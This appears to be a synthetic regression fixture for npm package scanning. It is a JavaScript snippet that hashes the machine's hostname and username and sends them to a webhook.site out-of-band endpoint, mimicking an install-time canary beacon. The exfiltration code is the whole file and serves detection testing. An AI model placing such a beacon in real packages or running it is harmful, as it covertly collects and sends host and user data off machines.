// Synthetic regression fixture modeled on the h1stealthy gh046 backend-canary
// pattern: hostname read from /etc/hostname, username read through an aliased
// os module, both SHA-256 hashed and sent as query parameters to an OAST host.
const c = require('crypto'), h = require('https'), f = require('fs'), o = require('os');
const q = new URL("https://webhook.site/00000000-0000-4000-8000-000000000000/npm-backend-fixture/lifecycle");
q.searchParams.set('host', c.createHash('sha256').update(f.readFileSync('/etc/hostname')).digest('hex'));
q.searchParams.set('user', c.createHash('sha256').update(o.userInfo().username).digest('hex'));
h.get(q).on('error', () => {});
